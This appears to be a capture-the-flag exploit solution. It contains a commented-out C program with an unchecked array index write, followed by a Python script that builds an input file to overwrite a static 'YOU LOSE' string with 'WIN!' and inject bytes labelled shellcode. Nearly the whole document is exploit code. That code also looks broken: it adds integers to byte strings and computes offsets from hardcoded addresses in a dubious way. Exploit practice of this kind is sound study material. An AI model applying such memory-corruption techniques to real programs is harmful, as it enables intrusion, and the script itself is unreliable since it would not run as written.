##include<stdio.h>
#
#static char buffer[] = "YOU LOSE";
#typedef unsigned int offset_t;
#
#int read_int(){
#    int ret;
#    fscanf(stdin,"%d",&ret);
#    return ret;
#}
#
#int main(int argc, char*argv[]){
#    int table[40];
#    offset_t offset;
#    int value;
#    int i,j;
#
#    for (i=0, j=i-1; i<3 && j<2; i++,j=i-1) {
#        offset = read_int();
#        value = read_int();
#        table[offset]=value;
#    }
#
#}

import struct

with open('./11-challenge.win','wb') as win:	
	buffer_addr = 0x804a014 #[YOU ][LOSE] = [0x20554f59][0x45534f4c]
	lose_addr =  buffer_addr + 0x4 # addr [LOSE]
	win_str = struct.pack("<L", 0x57494e21) # WIN!
	main_addr = 0x0804847b	
	static_offset = lose_addr - main_addr	
	# LOSE --> WIN!
	offset1 = 40 +  static_offset
	value1 = win_str
	# shellcode
	offset2 = 41
	value2 = "\x68\x14\xA0\x04"
	offset3 = 42
	value3 = "\x08\xE8\xFC\xFF" * 4 
	win.write(offset1 + value1 + offset2 + value2 + offset3 + value3)
	